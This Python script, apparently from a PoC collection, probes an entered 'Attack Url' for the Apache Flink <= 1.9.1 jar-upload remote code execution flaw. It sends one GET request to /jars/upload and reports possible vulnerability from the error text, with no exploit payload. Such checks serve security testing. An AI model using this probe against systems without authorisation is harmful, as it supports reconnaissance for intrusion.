#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech

import requests

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech         \033[0m')
    print('+  \033[34mVersion: Apache Flink <= 1.9.1          \033[0m')
    print('+  \033[36m使用格式: python3 Apache_Flink.py         \033[0m')
    print('+  \033[36mUrl    >>> http://xxx.xxx.xxx.xxx:9999  \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/jars/upload"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    try:
        response = requests.get(url=vuln_url, headers=headers, timeout=20)
        if "Unable to load requested file /jars/upload." in response.text:
            print("\033[32m[o] 可能存在 Apache Flink <= 1.9.1 远程代码执行漏洞\n\033[0m")
        else:
            print("\033[31m[x] 目标Url 文件上传模块无法使用\033[0m")
    except:
        print("\033[31m[x] 目标Url漏洞利用失败\033[0m")



if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)